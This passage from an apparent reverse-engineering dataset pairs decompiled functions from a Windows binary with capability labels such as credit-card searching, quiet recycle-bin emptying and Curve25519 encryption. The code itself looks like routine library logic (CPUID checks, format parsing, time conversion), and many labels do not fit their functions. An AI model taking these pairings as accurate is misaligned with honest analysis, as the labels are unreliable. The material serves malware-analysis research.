        "decompiled_code": "\nuint32_t __cdecl fcn.004711ae(uint32_t arg_8h)\n\n{\n    return (((arg_8h & 0x4000000 | (arg_8h >> 3 & 0x6000000 | arg_8h & 0x8000000) >> 2) >> 2 | arg_8h & 0x2000000) >> 2\n           | arg_8h & 0x1000000) >> 0x13;\n}\n",
        "token_count": 109
    },
    "004712ab": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004712ab(uint32_t arg_8h)\n\n{\n    return (((arg_8h & 0x40000 | (arg_8h >> 3 & 0x60000 | arg_8h & 0x80000) >> 2) >> 2 | arg_8h & 0x20000) >> 2 |\n           arg_8h & 0x10000) >> 0xb;\n}\n",
        "token_count": 102
    },
    "0046fc3b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0046fc3b(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint in_ECX;\n    int32_t var_4h;\n    \n    var_4h._1_3_ = in_ECX >> 8;\n    if (((arg_14h == 10) && (arg_ch < 1)) && (arg_ch < 0)) {\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n    }\n    else {\n        var_4h = var_4h._1_3_ << 8;\n    }\n    fcn.0046f89c(arg_8h, arg_ch, arg_10h, 0xffffffff, arg_14h, var_4h);\n    return arg_10h;\n}\n",
        "token_count": 201
    },
    "0046fcbb": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0046fcbb(uint arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint in_ECX;\n    int32_t var_4h;\n    \n    var_4h._1_3_ = in_ECX >> 8;\n    if (((arg_14h == 10) && (arg_ch < 1)) && (arg_ch < 0)) {\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n    }\n    else {\n        var_4h = var_4h._1_3_ << 8;\n    }\n    fcn.0046f97e(arg_8h, arg_ch, arg_10h, 0xffffffff, arg_14h, var_4h);\n    return arg_10h;\n}\n",
        "token_count": 200
    },
    "00430a27": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00430a96)\n// WARNING: Removing unreachable block (ram,0x00430a5a)\n// WARNING: Removing unreachable block (ram,0x00430b0e)\n\nuint fcn.00430a27(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x6ccba8 = 0;\n    *0x6cade8 = *0x6cade8 | 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(10);\n    uVar4 = *0x6cade8;\n    if (iVar3 != 0) {\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar5 = puVar2[3];\n        if (((piVar1[2] ^ 0x49656e69U | piVar1[3] ^ 0x6c65746eU | piVar1[1] ^ 0x756e6547U) == 0) &&\n           (((((uVar4 = *puVar2 & 0xfff3ff0,  uVar4 == 0x106c0 || (uVar4 == 0x20660)) || (uVar4 == 0x20670)) ||\n             ((uVar4 == 0x30650 || (uVar4 == 0x30660)))) || (uVar4 == 0x30670)))) {\n            *0x6ccbac = *0x6ccbac | 1;\n        }\n        if (*piVar1 < 7) {\n            uVar6 = 0;\n        }\n        else {\n            iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar3 + 4);\n            if ((uVar6 & 0x200) != 0) {\n                *0x6ccbac = *0x6ccbac | 2;\n            }\n        }\n        *0x6ccba8 = 1;\n        uVar4 = *0x6cade8 | 2;\n        if ((uVar5 & 0x100000) != 0) {\n            uVar4 = *0x6cade8 | 6;\n            *0x6ccba8 = 2;\n            if ((((uVar5 & 0x8000000) != 0) && ((uVar5 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x6ccba8 = 3;\n                uVar4 = *0x6cade8 | 0xe;\n                if ((uVar6 & 0x20) != 0) {\n                    *0x6ccba8 = 5;\n                    uVar4 = *0x6cade8 | 0x2e;\n                    if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                        *0x6cade8 = *0x6cade8 | 0x6e;\n                        *0x6ccba8 = 6;\n                        uVar4 = *0x6cade8;\n                    }\n                }\n            }\n        }\n    }\n    *0x6cade8 = uVar4;\n    return 0;\n}\n",
        "token_count": 858
    },
    "004376b1": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.004376b1(char **arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_18h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_8h = NULL;\n    var_4h = NULL;\n    if (**0x6ccc1c == '\\0') {\n        arg_8h_00 = 1;\ncode_r0x00437797:\n        fcn.00434635(arg_8h_00);\n        return arg_8h;\n    }\n    // switch table (8 cases) at 0x4377a5\n    switch(**0x6ccc1c) {\n    case '0':\n    case '1':\n        var_10h = \"char \";\n        goto code_r0x00437714;\n    case '2':\n    case '3':\n        var_10h = \"short \";\n        var_ch = 0x6;\n        break;\n    case '4':\n        goto code_r0x00437727;\n    case '5':\n        var_10h = \"int \";\n        var_ch = 0x4;\n        break;\n    case '6':\n    case '7':\n        var_10h = \"long \";\ncode_r0x00437714:\n        var_ch = 0x5;\n        break;\n    default:\n        arg_8h_00 = 2;\n        goto code_r0x00437797;\n    }\n    fcn.0043486d(&var_10h);\ncode_r0x00437727:\n    cVar1 = **0x6ccc1c;\n    *0x6ccc1c = *0x6ccc1c + 1;\n    if ((((cVar1 == '1') || (cVar1 == '3')) || (cVar1 == '5')) || (cVar1 == '7')) {\n        var_10h = \"unsigned \";\n        var_ch = 0x9;\n        fcn.00434593(&var_10h);\n        fcn.00434a09(&var_10h, &var_8h);\n        var_8h = var_10h;\n        var_4h = var_ch;\n    }\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 539
    },
    "00448f95": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __thiscall fcn.00448f95(uint32_t param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uchar uVar3;\n    uint32_t arg_ch;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint32_t noname_0;\n    uint arg_8h;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    arg_8h = *(param_1 + 8);\n    cVar2 = fcn.00454002(arg_8h);\n    if (cVar2 != '\\0') {\n        var_8h = param_1;\n        var_4h = param_1;\n        if (*(param_1 + 0xc) == 0) {\n            iVar4 = *(param_1 + 8);\n            *(iVar4 + 0x1c) = 1;\n            *(iVar4 + 0x18) = 0x16;\ncode_r0x00448fcc:\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        }\n        else {\n            do {\n                cVar2 = fcn.0044797f();\n                if (cVar2 == '\\0') {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar1 = **(param_1 + 0xc);\n                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                *(param_1 + 0x2d) = uVar1;\n                if (uVar1 != 0) {\n                    var_8h = var_8h & 0xffffff00 | uVar1;\n                    do {\n                        if (*(param_1 + 0x14) < 0) break;\n                        arg_ch = *(param_1 + 0x18);\n                        noname_0 = var_8h;\n                        uVar3 = fcn.00447bdb(var_8h, arg_ch);\n                        *(param_1 + 0x18) = uVar3;\n                        cVar2 = fcn.00454259();\n                        if (cVar2 == '\\0') {\n                            return 0xffffffff;\n                        }\n    // switch table (8 cases) at 0x449249\n                        switch(*(param_1 + 0x18)) {\n                        case 0:\n                            cVar2 = fcn.0044ac76();\n                            if (cVar2 == '\\0') {\n                                iVar4 = *(param_1 + 8);\n                                *(param_1 + 0x38) = 0;\n                                if (*(iVar4 + 0x14) == '\\0') {\n                                    fcn.00453bd0();\n                                }\n                                uVar1 = *(param_1 + 0x2d);\n                                iVar4 = fcn.00455ad2(**(iVar4 + 0xc), uVar1, 0x8000);\n                                if (iVar4 != 0) {\n                                    fcn.00454e8e(uVar1, param_1 + 0x14, *(param_1 + 8));\n                                    uVar1 = **(param_1 + 0xc);\n                                    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                                    *(param_1 + 0x2d) = uVar1;\n                                    if (uVar1 == 0) {\n                                        iVar4 = *(param_1 + 8);\n                                        *(iVar4 + 0x1c) = 1;\n                                        *(iVar4 + 0x18) = 0x16;\n                                        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                        iVar4 = *(param_1 + 8);\n                                        *(iVar4 + 0x1c) = 1;\n                                        *(iVar4 + 0x18) = 0x16;\n                                        fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n                                        return 0xffffffff;\n                                    }\n                                }\n                                var_4h = var_4h & 0xffffff00 | uVar1;\n                                fcn.00454e8e(var_4h, param_1 + 0x14, *(param_1 + 8));\n                            }\n                            break;\n                        case 1:\n                            *(param_1 + 0x24) = 0xffffffff;\n                            *(param_1 + 0x20) = 0;\n                            *(param_1 + 0x2c) = 0;\n                            *(param_1 + 0x1c) = 0;\n                            *(param_1 + 0x28) = 0;\n                            *(param_1 + 0x38) = 0;\n                            break;\n                        case 2:\n                            cVar2 = *(param_1 + 0x2d);\n                            if (cVar2 == ' ') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                            }\n                            else if (cVar2 == '#') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                            }\n                            else if (cVar2 == '+') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                            }\n                            else if (cVar2 == '-') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                            }\n                            else if (cVar2 == '0') {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                            }\n                            break;\n                        case 3:\n                            if (*(param_1 + 0x2d) != '*') {\n                                iVar4 = param_1 + 0x20;\ncode_r0x00449139:\n                                cVar2 = fcn.004487a1(iVar4);\n                                goto code_r0x004491b2;\n                            }\n                            cVar2 = fcn.00453825();\n                            if (cVar2 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar2 = fcn.0044ac12();\n                            if (cVar2 != '\\0') {\n                                if (*(param_1 + 0x20) < 0) {\n                                    *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                    *(param_1 + 0x20) = -*(param_1 + 0x20);\n                                }\ncode_r0x00449169:\n                                cVar2 = '\\x01';\n                                goto code_r0x004491b2;\n                            }\n                            break;\n                        case 4:\n                            *(param_1 + 0x24) = 0;\n                            break;\n                        case 5:\n                            if (*(param_1 + 0x2d) != '*') {\n                                iVar4 = param_1 + 0x24;\n                                goto code_r0x00449139;\n                            }\n                            cVar2 = fcn.00453c2b();\n                            if (cVar2 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            cVar2 = fcn.0044ac12();\n                            if (cVar2 != '\\0') {\n                                if (*(param_1 + 0x24) < 0) {\n                                    *(param_1 + 0x24) = 0xffffffff;\n                                }\n                                goto code_r0x00449169;\n                            }\n                            break;\n                        case 6:\n                            cVar2 = fcn.0044c57c();\n                            goto code_r0x004491b2;\n                        case 7:\n                            cVar2 = fcn.0044d8b7(noname_0, arg_ch, arg_8h, unaff_EDI, unaff_ESI, unaff_EBX, var_8h, \n                                                 var_4h, unaff_EBP, unaff_retaddr, param_2);\ncode_r0x004491b2:\n                            if (cVar2 == '\\0') {\n                                return 0xffffffff;\n                            }\n                            break;\n                        default:\n                            iVar4 = *(param_1 + 8);\n                            *(iVar4 + 0x1c) = 1;\n                            *(iVar4 + 0x18) = 0x16;\n                            goto code_r0x00448fcc;\n                        case 0xbad1abe1:\n                            goto code_r0x00448fdf;\n                        }\n                        uVar1 = **(param_1 + 0xc);\n                        *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                        *(param_1 + 0x2d) = uVar1;\n                        var_8h = var_8h & 0xffffff00 | uVar1;\n                    } while (uVar1 != 0);\n                }\n                cVar2 = fcn.0045479f();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x00448fdf:\n    return 0xffffffff;\n}\n",
        "token_count": 2155
    },
    "0044a691": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0044a691(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    uint16_t uVar2;\n    ushort uVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    char cVar6;\n    uchar uVar7;\n    int32_t iVar8;\n    \n    ppiVar1 = param_1 + 0x448;\n    cVar6 = fcn.0045409c(*(param_1 + 8));\n    if (cVar6 != '\\0') {\n        if (*(param_1 + 0xc) == 0) {\n            iVar8 = *(param_1 + 8);\n            *(iVar8 + 0x1c) = 1;\n            *(iVar8 + 0x18) = 0x16;\ncode_r0x0044a6c5:\n            fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        }\n        else {\n            do {\n                cVar6 = fcn.00447a69();\n                if (cVar6 == '\\0') {\n                    return *(param_1 + 0x14);\n                }\n                *(param_1 + 0x34) = 0;\n                *(param_1 + 0x18) = 0;\n                uVar2 = **(param_1 + 0xc);\n                *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                *(param_1 + 0x2e) = uVar2;\n                while ((uVar2 != 0 && (-1 < *(param_1 + 0x14)))) {\n                    uVar7 = fcn.00447df6(uVar2, *(param_1 + 0x18));\n                    *(param_1 + 0x18) = uVar7;\n                    cVar6 = fcn.004545ab();\n                    if (cVar6 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x44a8d9\n                    switch(*(param_1 + 0x18)) {\n                    case 0:\n                        cVar6 = fcn.0044acf4();\n                        if (cVar6 == '\\0') {\n                            uVar3 = *(param_1 + 0x2e);\n                            *(param_1 + 0x38) = 1;\n                            piVar5 = *ppiVar1;\n                            if (piVar5[2] == piVar5[1]) {\n                                if (*(piVar5 + 3) == '\\0') {\n                                    *(param_1 + 0x14) = 0xffffffff;\n                                }\n                                else {\n                                    *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                }\n                            }\n                            else {\n                                *(param_1 + 0x14) = *(param_1 + 0x14) + 1;\n                                piVar5[2] = piVar5[2] + 1;\n                                ***ppiVar1 = uVar3;\n                                **ppiVar1 = **ppiVar1 + 2;\n                            }\n                        }\n                        break;\n                    case 1:\n                        *(param_1 + 0x24) = 0xffffffff;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x1c) = 0;\n                        *(param_1 + 0x28) = 0;\n                        *(param_1 + 0x38) = 0;\n                        break;\n                    case 2:\n                        iVar4 = *(param_1 + 0x2e);\n                        if (iVar4 == 0x20) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 2;\n                        }\n                        else if (iVar4 == 0x23) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 0x20;\n                        }\n                        else if (iVar4 == 0x2b) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 1;\n                        }\n                        else if (iVar4 == 0x2d) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                        }\n                        else if (iVar4 == 0x30) {\n                            *(param_1 + 0x1c) = *(param_1 + 0x1c) | 8;\n                        }\n                        break;\n                    case 3:\n                        if (*(param_1 + 0x2e) != 0x2a) {\n                            iVar8 = param_1 + 0x20;\ncode_r0x0044a7fe:\n                            cVar6 = fcn.00448be1(iVar8);\n                            goto code_r0x0044a87a;\n                        }\n                        cVar6 = fcn.00453aa5();\n                        if (cVar6 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        cVar6 = fcn.0044ac54();\n                        if (cVar6 != '\\0') {\n                            if (*(param_1 + 0x20) < 0) {\n                                *(param_1 + 0x1c) = *(param_1 + 0x1c) | 4;\n                                *(param_1 + 0x20) = -*(param_1 + 0x20);\n                            }\ncode_r0x0044a82e:\n                            cVar6 = '\\x01';\n                            goto code_r0x0044a87a;\n                        }\n                        break;\n                    case 4:\n                        *(param_1 + 0x24) = 0;\n                        break;\n                    case 5:\n                        if (*(param_1 + 0x2e) != 0x2a) {\n                            iVar8 = param_1 + 0x24;\n                            goto code_r0x0044a7fe;\n                        }\n                        cVar6 = fcn.00453eab();\n                        if (cVar6 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        cVar6 = fcn.0044ac54();\n                        if (cVar6 != '\\0') {\n                            if (*(param_1 + 0x24) < 0) {\n                                *(param_1 + 0x24) = 0xffffffff;\n                            }\n                            goto code_r0x0044a82e;\n                        }\n                        break;\n                    case 6:\n                        cVar6 = fcn.0044d261();\n                        goto code_r0x0044a87a;\n                    case 7:\n                        cVar6 = fcn.0044f793();\ncode_r0x0044a87a:\n                        if (cVar6 == '\\0') {\n                            return 0xffffffff;\n                        }\n                        break;\n                    default:\n                        iVar8 = *(param_1 + 8);\n                        *(iVar8 + 0x1c) = 1;\n                        *(iVar8 + 0x18) = 0x16;\n                        goto code_r0x0044a6c5;\n                    case 0xbad1abe1:\n                        goto code_r0x0044a6d8;\n                    }\n                    uVar2 = **(param_1 + 0xc);\n                    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n                    *(param_1 + 0x2e) = uVar2;\n                }\n                cVar6 = fcn.004549cd();\n            } while (cVar6 != '\\0');\n        }\n    }\ncode_r0x0044a6d8:\n    return 0xffffffff;\n}\n",
        "token_count": 1750
    },
    "0045620a": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045624a)\n\nint64_t __cdecl fcn.0045620a(uint *arg_8h)\n\n{\n    int64_t iVar1;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&var_8h);\n    iVar1 = fcn.00476cf0(var_8h + 0x2ac18000, (var_4h + -0x19db1de) - (var_8h < 0xd53e8000), 10000000, 0);\n    if (0x793582aff < iVar1) {\n        iVar1 = -1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = iVar1;\n        arg_8h[1] = iVar1 >> 0x20;\n    }\n    return iVar1;\n}\n",
        "token_count": 232
    },
    "00456519": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00456559)\n\nint64_t __cdecl fcn.00456519(uint *arg_8h)\n\n{\n    int64_t iVar1;\n    uint32_t lpSystemTimeAsFileTime;\n    int32_t var_4h;\n    \n    lpSystemTimeAsFileTime = 0;\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&lpSystemTimeAsFileTime);\n    iVar1 = fcn.00476cf0(lpSystemTimeAsFileTime + 0x2ac18000, \n                         (var_4h + -0x19db1de) - (lpSystemTimeAsFileTime < 0xd53e8000), 10000000, 0);\n    if (0x793582aff < iVar1) {\n        iVar1 = -1;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = iVar1;\n        arg_8h[1] = iVar1 >> 0x20;\n    }\n    return iVar1;\n}\n",
        "token_count": 242
    },
    "0040c2c0": {
        "rules": [
            "parse credit card information/29d58176023943f783771ab0ee81acbc",
            "parse credit card information/29d58176023943f783771ab0ee81acbc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c2c0(uint arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int16_t **extraout_ECX;\n    uint unaff_ESI;\n    uint32_t uVar5;\n    int16_t *piStackY8204;\n    int16_t iStackY8200;\n    uint uStackY48;\n    int32_t iStackY40;\n    uchar *puStackY36;\n    uint uStackY32;\n    uint var_4h;\n    \n    fcn.00430400();\n    piStackY8204 = NULL;\n    iVar2 = fcn.00409550(arg_8h, &stack0xffffdff4);\n    if (-1 < iVar2) {\n        *extraout_ECX = piStackY8204;\n        iVar1 = *piStackY8204;\njoined_r0x0040c30a:\n        if (iVar1 != 0) {\n            uStackY32 = 0x40c31e;\n            iVar2 = fcn.00406910(&stack0xffffdff8);\n            if (iVar2 < 0) goto code_r0x0040c356;\n            iVar2 = 0;\n            uVar5 = 0;\n            while( true ) {\n                uStackY32 = *(uVar5 + 0x47b9f8);\n                puStackY36 = &stack0xffffdff8;\n                iStackY40 = 0x40c343;\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)();\n                if (iVar3 == 0) break;\n                uVar5 = uVar5 + 8;\n                iVar2 = iVar2 + 1;\n                if (0x6f < uVar5) goto code_r0x0040c356;\n            }\n            iVar2 = *(iVar2 * 8 + 0x47b9fc);\n            if (((iVar2 == 0) || (iVar3 = fcn.00406910(&stack0xffffdff8),  iVar3 < 0)) || (iStackY8200 != 0x7b))\n            goto code_r0x0040c356;\n            if (arg_ch == 0) {\n                uStackY32 = 0x40c3fb;\n                iVar2 = fcn.0040c5c0(&stack0xffffdff8, iVar2, 0, 0);\n                if (iVar2 < 0) goto code_r0x0040c356;\n            }\n            else {\n                piVar4 = *extraout_ECX;\n                uStackY32 = 0x40c3c4;\n                iVar3 = fcn.0040c5c0(&stack0xffffdff8, iVar2, arg_ch, 0);\n                if (iVar3 < 0) {\n                    uStackY32 = 0;\n                    puStackY36 = NULL;\n                    *extraout_ECX = piVar4;\n                    uStackY48 = 0x40c3e5;\n                    iStackY40 = iVar2;\n                    fcn.0040c5c0(&stack0xffffdff8, iVar2, 0, 0);\n                    goto code_r0x0040c356;\n                }\n            }\n            do {\n                iVar1 = **extraout_ECX;\n    // switch table (24 cases) at 0x40c43c\n                switch(iVar1) {\n                case 9:\n                case 10:\n                case 0xd:\n                case 0x20:\n                    uStackY32 = 0x40c427;\n                    piVar4 = (*_sym.imp.USER32.dll_CharNextW)();\n                    *extraout_ECX = piVar4;\n                    break;\n                default:\n                    goto code_r0x0040c42b;\n                }\n            } while( true );\n        }\ncode_r0x0040c356:\n        uStackY32 = 0x40c362;\n        (*_sym.imp.ole32.dll_CoTaskMemFree)();\n    }\n    fcn.004303e9(unaff_ESI);\n    return;\ncode_r0x0040c42b:\n    goto joined_r0x0040c30a;\n}\n",
        "token_count": 959
    },
    "0040d610": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d610(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint unaff_EDI;\n    uchar auStackY8200 [8172];\n    uint uStackY28;\n    int16_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.00430400();\n    if ((*arg_8h == 0x3d) && (arg_8h_00 = arg_8h,  iVar1 = fcn.00406910(arg_8h),  -1 < iVar1)) {\n        fcn.0040d690();\n        iVar1 = fcn.00406910(&stack0xffffdff8);\n        if (-1 < iVar1) {\n            uStackY28 = 0x40d65f;\n            fcn.00406910(arg_8h);\n            fcn.004303e9(arg_8h_00);\n            return;\n        }\n    }\n    fcn.004303e9(unaff_EDI);\n    return;\n}\n",
        "token_count": 248
    },
    "00457746": {
        "rules": [
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653",
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00457746(char *arg_8h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    iVar6 = 0;\n    cVar2 = *arg_8h;\n    pcVar5 = arg_8h;\n    while (cVar2 != '\\0') {\n        if (cVar2 != '=') {\n            iVar6 = iVar6 + 1;\n        }\n        do {\n            cVar2 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar2 != '\\0');\n        cVar2 = *pcVar5;\n    }\n    piVar3 = fcn.00460ec9(iVar6 + 1, 4);\n    var_4h = piVar3;\n    if (piVar3 == NULL) {\n        fcn.0045d185(0);\n        piVar3 = NULL;\n    }\n    else {\n        for (; *arg_8h != '\\0'; arg_8h = arg_8h + pcVar5) {\n            pcVar5 = arg_8h;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n            if (*arg_8h != '=') {\n                iVar6 = fcn.00460ec9(pcVar5, 1);\n                if (iVar6 == 0) {\n                    fcn.00457946(piVar3);\n                    fcn.0045d185(0);\n                    fcn.0045d185(0);\n                    return NULL;\n                }\n                iVar4 = fcn.0045acc6(iVar6, pcVar5, arg_8h);\n                if (iVar4 != 0) {\n                    fcn.0043bb6b(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    piVar3 = (*pcVar1)();\n                    return piVar3;\n                }\n                *var_4h = iVar6;\n                var_4h = var_4h + 1;\n                fcn.0045d185(0);\n            }\n        }\n        fcn.0045d185(0);\n    }\n    return piVar3;\n}\n",
        "token_count": 573
    },
    "004321e5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004321e5(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_10h;\n    uint lpArguments;\n    int32_t *var_8h;\n    uint8_t *var_4h;\n    \n    lpArguments = 0x19930520;\n    if (arg_ch != NULL) {\n        if ((*arg_ch & 0x10) != 0) {\n            iVar1 = *(*arg_8h + -4);\n            pcVar2 = *(iVar1 + 0x20);\n            arg_ch = *(iVar1 + 0x18);\n            (**0x47b3f8)(*arg_8h + -4);\n            (*pcVar2)();\n            if (arg_ch == NULL) goto code_r0x0043222c;\n        }\n        if ((*arg_ch & 8) != 0) {\n            lpArguments = 0x1994000;\n        }\n    }\ncode_r0x0043222c:\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0xe06d7363, 1, 3, &lpArguments);\n    return;\n}\n",
        "token_count": 287
    },
    "004524ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004524ec(int32_t param_1)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    ppuVar1 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = ppuVar1 + 1;\n    puVar2 = *ppuVar1;\n    iVar3 = fcn.0045f1b5();\n    if (iVar3 == 0) {\ncode_r0x00452506:\n        iVar3 = *(param_1 + 8);\n        *(iVar3 + 0x1c) = 1;\n        *(iVar3 + 0x18) = 0x16;\n        uVar4 = fcn.0043bac1(0, 0, 0, 0, 0, *(param_1 + 8));\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar3 = fcn.0045027c(*(param_1 + 0x28));\n        if (iVar3 == 1) {\n            uVar4 = 0;\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 2) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = *(param_1 + 0x14);\n        }\n        else if (iVar3 == 4) {\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n        }\n        else {\n            if (iVar3 != 8) goto code_r0x00452506;\n            uVar4 = *(param_1 + 0x14);\n            *puVar2 = uVar4;\n            puVar2[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x2c) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 478
    },
    "00452571": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
